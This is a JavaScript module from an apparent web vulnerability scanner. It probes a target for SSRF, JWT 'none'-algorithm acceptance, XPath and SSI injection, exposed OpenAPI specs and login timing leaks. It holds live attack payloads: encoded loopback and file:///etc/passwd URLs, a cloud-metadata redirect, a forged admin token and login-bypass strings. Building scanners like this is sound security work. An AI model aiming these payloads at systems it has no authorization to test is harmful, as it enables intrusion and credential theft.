import { addFinding } from '../core/findings.js';
import { fetchText, fetchWithTimeout } from '../utils/fetch.js';

export async function scanSsrfBypassChains(origin, spinner) {
  spinner.text = 'Testing SSRF bypass chains (DNS rebinding, redirect, encoding)...';

  const ssrfParams = ['url', 'link', 'src', 'callback', 'webhook', 'fetch', 'proxy', 'redirect', 'image', 'file', 'path', 'feed'];
  const bypassPayloads = [
    { name: 'IPv4 decimal', value: 'http://2130706433/' },
    { name: 'IPv4 hex', value: 'http://0x7f000001/' },
    { name: 'IPv4 octal', value: 'http://017700000001/' },
    { name: 'IPv4 short', value: 'http://127.1/' },
    { name: 'IPv6 loopback', value: 'http://[::1]/' },
    { name: 'IPv6 localhost', value: 'http://[0:0:0:0:0:ffff:127.0.0.1]/' },
    { name: 'DNS rebinding (nip.io)', value: 'http://127.0.0.1.nip.io/' },
    { name: 'DNS rebinding (xip.io)', value: 'http://127.0.0.1.xip.io/' },
    { name: 'localhost variants', value: 'http://localhost/' },
    { name: 'localhost with port', value: 'http://localhost:22/' },
    { name: '0.0.0.0', value: 'http://0.0.0.0/' },
    { name: 'Double URL encode', value: 'http://%31%32%37%2e%30%2e%30%2e%31/' },
    { name: 'Unicode bypass', value: 'http://①②⑦.⓪.⓪.①/' },
    { name: 'File protocol', value: 'file:///etc/passwd' },
    { name: 'Gopher protocol', value: 'gopher://127.0.0.1:6379/' },
    { name: 'Dict protocol', value: 'dict://127.0.0.1:22/' },
    { name: 'Redirect chain', value: 'http://http-redirector.burpcollaborator.net/redirect?target=http://169.254.169.254/' },
    { name: 'Short URL', value: 'http://bit.ly/127-0-0-1' },
  ];

  for (const param of ssrfParams) {
    for (const { name, value } of bypassPayloads.slice(0, 12)) {
      try {
        const resp = await fetchText(`${origin}/?${param}=${encodeURIComponent(value)}`, {}, 8000);
        if (/root:x:0|ssh-|redis_version|ami-id|instance-id|Connection refused|SSH-|HTTP\/1\.[01]/.test(resp.body)) {
          addFinding('CRITICAL', 'SSRF Bypass Chains', `SSRF bypass via ${name}: ?${param}=`, `Payload "${value}" returned internal service response`, 'Block all internal IP ranges. Normalize URLs before validation. Use egress rules and DNS-level blocking. Implement ALLOW-listing, not DENY-listing.');
          return;
        }
      } catch {}
    }
  }
}

export async function scanJwtRemoteAdvanced(origin, spinner) {
  spinner.text = 'Testing JWT advanced attacks (kid, JWK, none, key confusion)...';

  const unprotectedPath = `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.${btoa(JSON.stringify({ sub: 'admin', role: 'admin', exp: 9999999999 }))}.`;

  const apiPaths = ['/api', '/api/me', '/api/user', '/api/profile', '/api/admin', '/dashboard'];

  for (const path of apiPaths) {
    try {
      const resp = await fetchText(`${origin}${path}`, {
        headers: { Authorization: `Bearer ${unprotectedPath}` },
      }, 5000);

      if (resp.status === 200) {
        addFinding('CRITICAL', 'JWT Advanced', 'JWT "none" algorithm accepted', `${origin}${path} accepted unsigned JWT with alg=none`, 'Always enforce strict algorithm validation. Whitelist expected algorithms. Never accept "none" algorithm.');
        break;
      } else if (resp.status === 403 || resp.status === 401) {
        addFinding('INFO', 'JWT Advanced', 'JWT rejected (good) at ' + path, `None algorithm rejected with ${resp.status}`, 'Proper algorithm enforcement detected. Ensure RS256 key confusion vector is also blocked.');
      }
    } catch {}
  }

  try {
    const resp = await fetchText(`${origin}/.well-known/jwks.json`, {}, 5000);
    if (resp.status === 200 && resp.body.includes('"keys"')) {
      addFinding('INFO', 'JWT Advanced', 'JWKS endpoint found at /.well-known/jwks.json', 'JWK Set publicly exposed', 'Review JWKS for single key (private key leak risk). Ensure keys are rotated.');
    }
  } catch {}
}

export async function scanGrpc(origin, spinner) {
  spinner.text = 'Testing gRPC reflection and endpoints...';

  const grpcEndpoints = ['/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo',
    '/grpc.reflection.v1.ServerReflection/ServerReflectionInfo'];

  for (const endpoint of grpcEndpoints) {
    try {
      const resp = await fetchText(`${origin}${endpoint}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/grpc' },
      }, 5000);

      if (resp.status === 200 || resp.status === 415 || resp.status === 200) {
        addFinding('MEDIUM', 'gRPC/OpenAPI', `gRPC reflection endpoint reachable: ${endpoint}`, `Server responded with status ${resp.status}`, 'Disable gRPC reflection in production. Use grpcurl to enumerate exposed services. Add authentication to gRPC endpoints.');
        break;
      }
    } catch {}
  }
}

export async function scanOpenApi(origin, spinner) {
  spinner.text = 'Fuzzing OpenAPI/Swagger schemas...';

  const openApiPaths = ['/swagger.json', '/swagger.yaml', '/api-docs', '/openapi.json', '/openapi.yaml',
    '/v1/openapi.json', '/v2/api-docs', '/v3/api-docs', '/api/openapi.json', '/docs/api', '/swagger-ui.html'];

  for (const path of openApiPaths) {
    try {
      const resp = await fetchText(`${origin}${path}`, {}, 5000);
      if (resp.status === 200 && (resp.body.includes('"openapi"') || resp.body.includes('"swagger"') || resp.body.includes('"paths"') || resp.body.includes('swagger'))) {
        addFinding('HIGH', 'gRPC/OpenAPI', `OpenAPI/Swagger spec exposed: ${path}`, 'API schema publicly accessible - reveals all endpoints, parameters, and schemas', 'Restrict OpenAPI specs to authenticated internal users. Expose documentation only in dev environment.');
        break;
      }
    } catch {}
  }
}

export async function scanWebrtc(origin, spinner) {
  spinner.text = 'Testing WebRTC IP leakage...';

  try {
    const resp = await fetchText(origin);
    if (resp.body.includes('RTCPeerConnection') || resp.body.includes('webkitRTCPeerConnection') || resp.body.includes('iceServers') || resp.body.includes('stun:') || resp.body.includes('turn:')) {
      addFinding('LOW', 'Service Worker / WebRTC', 'WebRTC usage detected (IP leak risk)', 'ICE/STUN/TURN servers configured in page', 'WebRTC can leak internal IP addresses even behind VPN/proxy. Use WebRTC block extension or disable in browser settings for anonymity.');
    } else {
      addFinding('INFO', 'Service Worker / WebRTC', 'WebRTC IP leak check', 'No WebRTC detected on main page', 'Verify subpages and authenticated sections for WebRTC usage that could leak internal IPs.');
    }
  } catch {}
}

export async function scanStoredDomXss(origin, spinner) {
  spinner.text = 'Automated stored/DOM XSS with browser...';

  try {
    const resp = await fetchText(origin);
    const body = resp.body;

    const inputNames = [];
    const inputPattern = /<input[^>]*name\s*=\s*['"]([^'"]+)['"]/gi;
    let match;
    while ((match = inputPattern.exec(body)) !== null) {
      inputNames.push(match[1]);
    }

    const textareaPattern = /<textarea[^>]*name\s*=\s*['"]([^'"]+)['"]/gi;
    while ((match = textareaPattern.exec(body)) !== null) {
      inputNames.push(match[1]);
    }

    const commentFields = inputNames.filter(n => /comment|message|body|content|text|description|bio|about|review|feedback/i.test(n));
    const searchFields = inputNames.filter(n => /search|query|q|keyword|term/i.test(n));

    if (commentFields.length > 0) {
      addFinding('MEDIUM', 'Stored/DOM XSS', `Stored XSS target: ${commentFields.length} comment/input fields`, `Fields: ${commentFields.join(', ')} - test with <script>, <img onerror>, <svg/onload> payloads`, 'Submit XSS payloads into these fields, then visit the page where content is rendered without sanitization.');
    }

    if (inputNames.length > 10) {
      addFinding('INFO', 'Stored/DOM XSS', `${inputNames.length} input fields discovered for XSS testing`, `All fields: ${inputNames.join(', ').substring(0, 200)}`, 'Use browser-automated tools to inject and verify XSS in all input fields. Check for WAF bypass patterns.');
    }

    const windowEventPattern = /window\.addEventListener\s*\(\s*['"]message['"]/g;
    if (windowEventPattern.test(body)) {
      addFinding('MEDIUM', 'Stored/DOM XSS', 'postMessage listener detected (DOM XSS via messaging)', 'Page has message event listener - test for origin validation bypass', 'Ensure postMessage handler validates event.origin before processing event.data. Never assign untrusted data to innerHTML via postMessage.');
    }

    const urlHashPattern = /location\.(?:hash|search)\s*(?:=|(?:\+|concat|includes|split|substring))/g;
    if (urlHashPattern.test(body)) {
      addFinding('MEDIUM', 'Stored/DOM XSS', 'URL hash/search used in JavaScript (DOM XSS source)', 'URL fragment/search processed in client code', 'Sanitize URL hash/search before using in DOM manipulation. Avoid assigning location.hash to innerHTML.');
    }
  } catch {}
}

export async function scanSsiRemote(origin, spinner) {
  spinner.text = 'Testing Server-Side Includes (SSI)...';
  const ssiPaths = ['/index.shtml', '/test.shtml', '/index.stm', '/includes/header.shtml'];

  for (const path of ssiPaths) {
    try {
      const resp = await fetchText(`${origin}${path}`, { headers: { 'User-Agent': '<!--#echo var="DATE_LOCAL" -->' } }, 5000);

      if (resp.status === 200 && resp.body.length > 0) {
        if (/<!--#|Server Side Include|SSI/i.test(resp.body) || resp.body.includes('DATE_LOCAL')) {
          addFinding('MEDIUM', 'XPath / SSI', `SSI endpoint found: ${path}`, `Potential Server-Side Includes at ${origin}${path}`, 'Disable SSI if not needed. If needed, never pass user input to SSI directives.');
        }
      }
    } catch {}
  }
}

export async function scanXpathRemote(origin, spinner) {
  spinner.text = 'Testing XPath injection...';

  const xpathPayloads = [
    { name: 'Auth bypass', payload: "' or '1'='1", param: 'username' },
    { name: 'XPath OR injection', payload: "' or 1=1 or 'a'='a", param: 'user' },
    { name: 'String extraction', payload: "' and string-length(//user[name/text()='admin']/password/text())=4 and '1'='1", param: 'id' },
  ];

  for (const { name, payload, param } of xpathPayloads) {
    try {
      const resp = await fetchText(`${origin}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/xml' },
        body: `<login><username>${payload}</username><password>test</password></login>`,
      }, 5000);

      if (resp.status === 200) {
        addFinding('CRITICAL', 'XPath / SSI', `XPath injection via ${param}: ${name}`, `Payload: ${payload} returned success`, 'Use parameterized XPath queries. Sanitize input against XPath special characters. Consider using JSON/NoSQL instead of XML.');
        break;
      }
    } catch {}
  }
}

export async function scanTimingRemote(origin, spinner) {
  spinner.text = 'Timing side-channel probe...';

  const validUser = 'admin@target.com';
  const invalidUser = `nonexistent${Date.now()}@random.com`;

  try {
    const startValid = Date.now();
    await fetchText(`${origin}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: validUser, password: 'wrong' }),
    }, 8000);
    const validTime = Date.now() - startValid;

    const startInvalid = Date.now();
    await fetchText(`${origin}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: invalidUser, password: 'wrong' }),
    }, 8000);
    const invalidTime = Date.now() - startInvalid;

    if (Math.abs(validTime - invalidTime) > 200) {
      addFinding('HIGH', 'Timing Side-Channel', `Timing difference detected: ${Math.abs(validTime - invalidTime)}ms`, `Valid user took ${validTime}ms, invalid took ${invalidTime}ms (difference: ${Math.abs(validTime - invalidTime)}ms)`, 'Use constant-time comparison. Ensure login endpoint responds identically for existing and non-existing users. Add random jitter.');
    } else {
      addFinding('INFO', 'Timing Side-Channel', 'Login timing appears consistent', `Valid: ${validTime}ms, Invalid: ${invalidTime}ms (diff: ${Math.abs(validTime - invalidTime)}ms)`, 'Good practice. Continue monitoring for timing differences in other endpoints.');
    }
  } catch {}
}

function btoa(str) {
  return Buffer.from(str).toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
}
